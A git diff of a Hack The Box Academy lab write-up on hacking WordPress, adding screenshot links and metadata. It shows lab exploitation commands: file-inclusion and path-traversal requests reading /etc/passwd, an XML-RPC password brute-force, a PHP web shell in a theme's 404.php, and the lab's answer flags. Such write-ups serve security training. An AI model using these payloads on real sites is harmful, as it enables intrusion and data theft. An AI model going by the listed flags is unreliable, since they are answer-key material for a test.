@@ -1,5 +1,11 @@
 # HTB Academy Write-up: Hacking WordPress
 
+**Author:** OULGRISS ABDELLAH 
+**Date:** October 05, 2025  
+**Platform:** Hack The Box Academy  
+**Module:** Hacking WordPress  
+**Difficulty:** Intermediate
+
 ## Overview
 Practical penetration testing of WordPress installations covering enumeration, vulnerability assessment, and exploitation techniques.
 
@@ -33,6 +39,8 @@ tree -L 1 /var/www/html
 ├── wp-trackback.php
 └── xmlrpc.php
 ```
+
+![alt text](screenshots/Hacking_Wordpress/1.PNG)
 
 ### Key WordPress Files
 - `index.php` - The homepage of WordPress
@@ -68,20 +76,32 @@ tree -L 1 /var/www/html/wp-content
 #### Q1: Directory Enumeration and Flag Retrieval
 **Objective:** Manually enumerate directories with listing enabled and locate flag.txt
 
+![alt text](screenshots/Hacking_Wordpress/2.PNG)
+
 ```bash
 curl -s http://94.237.51.6:59835/wp-content/plugins/mail-masta/
 ```
+![alt text](screenshots/Hacking_Wordpress/3.PNG)
 
 **Browser Access:**
 ```
 http://94.237.51.6:59835/wp-content/plugins/mail-masta/
 ```
 
+![alt text](screenshots/Hacking_Wordpress/4.PNG)
+
 Navigate to `/inc` directory and open `flag.txt`
 
+![alt text](screenshots/Hacking_Wordpress/5.PNG)
+
+
+![alt text](screenshots/Hacking_Wordpress/6.PNG)
 **Answer:** `HTB{3num3r4t10n_15_k3y}`
 
 #### Q2: User Enumeration
+
+![alt text](screenshots/Hacking_Wordpress/7.PNG)
+
 **Objective:** Identify username for User ID 2
 
 **Method:** Review posts to uncover user IDs and corresponding usernames
@@ -98,6 +118,11 @@ curl -s -X POST \
   http://94.237.51.6:59835/xmlrpc.php | grep value > rpc.txt
 ```
 
+![alt text](screenshots/Hacking_Wordpress/8.PNG)
+
+![alt text](screenshots/Hacking_Wordpress/9.PNG)
+
+![alt text](screenshots/Hacking_Wordpress/10.PNG)
 **Answer:** `80`
 
 #### Q4: WPScan Plugin Enumeration
@@ -106,11 +131,18 @@ curl -s -X POST \
 ```bash
 wpscan --url http://94.237.51.6:59835 --plugins-detection aggressive -e vp --api-token YOUR_API_TOKEN
 ```
+![alt text](screenshots/Hacking_Wordpress/11.PNG)
+
+![alt text](screenshots/Hacking_Wordpress/12.PNG)
+
+![alt text](screenshots/Hacking_Wordpress/13.PNG)
 
 **Plugin Verification:**
 ```
 http://94.237.51.6:59835/wp-content/plugins/photo-gallery/readme.txt
 ```
+
+![alt text](screenshots/Hacking_Wordpress/14.PNG)
 
 **Answer:** `1.5.34`
 
@@ -120,6 +152,7 @@ http://94.237.51.6:59835/wp-content/plugins/photo-gallery/readme.txt
 ```bash
 curl -s "http://94.237.51.6:59835/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
 ```
+![alt text](screenshots/Hacking_Wordpress/15.PNG)
 
 **Answer:** `sally.jones`
 
@@ -129,6 +162,9 @@ curl -s "http://94.237.51.6:59835/wp-content/plugins/mail-masta/inc/campaign/cou
 ```bash
 wpscan --password-attack xmlrpc -U roger -P /usr/share/wordlists/rockyou.txt --url http://94.237.51.6:59835
 ```
+![alt text](screenshots/Hacking_Wordpress/16.PNG)
+
+![alt text](screenshots/Hacking_Wordpress/17.PNG)
 
 **Answer:** `lizard`
 
@@ -140,6 +176,8 @@ wpscan --password-attack xmlrpc -U roger -P /usr/share/wordlists/rockyou.txt --u
 - Username: `admin`
 - Password: `sunshine1`
 
+![alt text](screenshots/Hacking_Wordpress/18.PNG)
+
 **Web Shell Implementation:**
 ```php
 <?php
@@ -149,10 +187,25 @@ if (isset($_GET['cmd'])) {
 ?>
 ```
 
+![alt text](screenshots/Hacking_Wordpress/19.PNG)
+
+
+![alt text](screenshots/Hacking_Wordpress/20.PNG)
+
+
+![alt text](screenshots/Hacking_Wordpress/21.PNG)
+
+
+![alt text](screenshots/Hacking_Wordpress/22.PNG)
+
+
+![alt text](screenshots/Hacking_Wordpress/23.PNG)
 **Flag Retrieval:**
 ```
 http://94.237.51.6:59835/wp-content/themes/twentysixteen/404.php?cmd=cat+/home/wp-user/flag.txt
 ```
+
+![alt text](screenshots/Hacking_Wordpress/24.PNG)
 
 **Answer:** `HTB{rc3_By_d3s1gn}`
 
@@ -170,19 +223,40 @@ echo "10.129.207.105 inlanefreight.local" | sudo tee -a /etc/hosts
 ```bash
 wpscan --url http://blog.inlanefreight.local --enumerate t
 ```
+![alt text](screenshots/Hacking_Wordpress/25.PNG)
+
+![alt text](screenshots/Hacking_Wordpress/26.PNG)
+
 
 **Answer:** `5.1.6`
 
 #### Q2: Active Theme Identification
+
+![alt text](screenshots/Hacking_Wordpress/27.PNG)
+
 **Answer:** `twentynineteen`
 
 #### Q3: Directory Listing Flag
+
+![alt text](screenshots/Hacking_Wordpress/28.PNG)
+
+
+![alt text](screenshots/Hacking_Wordpress/29.PNG)
+
+![alt text](screenshots/Hacking_Wordpress/30.PNG)
+
+
 **Answer:** `HTB{d1sabl3_d1r3ct0ry_l1st1ng!}`
 
 #### Q4: Non-admin User Enumeration
 ```bash
 wpscan --url http://blog.inlanefreight.local --enumerate u
 ```
+
+![alt text](screenshots/Hacking_Wordpress/31.PNG)
+
+
+![alt text](screenshots/Hacking_Wordpress/32.PNG)
 
 **Answer:** `Charlie Wiggins`
 
@@ -193,15 +267,34 @@ wpscan --url http://blog.inlanefreight.local --enumerate u
 curl "http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/download.php?file=../../../../flag.txt"
 ```
 
+![alt text](screenshots/Hacking_Wordpress/33.PNG)
+
+![alt text](screenshots/Hacking_Wordpress/34.PNG)
+
+![alt text](screenshots/Hacking_Wordpress/35.PNG)
+
+![alt text](screenshots/Hacking_Wordpress/36.PNG)
+
+
 **Answer:** `HTB{unauTh_d0wn10ad!}`
 
 #### Q6: LFI Vulnerable Plugin Version
+
+![alt text](screenshots/Hacking_Wordpress/37.PNG)
+
+![alt text](screenshots/Hacking_Wordpress/38.PNG)
+
 **Answer:** `1.1.1`
 
 #### Q7: System User Discovery via LFI
 ```bash
 curl -s "http://blog.inlanefreight.local/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=../../../../../../../../../../../../../../../../../etc/passwd"
 ```
+
+![alt text](screenshots/Hacking_Wordpress/39.PNG)
+
+
+![alt text](screenshots/Hacking_Wordpress/40.PNG)
 
 **Answer:** `frank.mclane`
 
@@ -212,6 +305,8 @@ curl -s "http://blog.inlanefreight.local/wp-content/plugins/site-editor/editor/e
 3. PHP web shell deployment in 404.php template
 4. Reverse shell establishment
 5. Flag retrieval from `/home/erika`
+
+![alt text](screenshots/Hacking_Wordpress/41.PNG)
 
 **Answer:** `HTB{w0rdPr355_4SS3ssm3n7}`
 ```
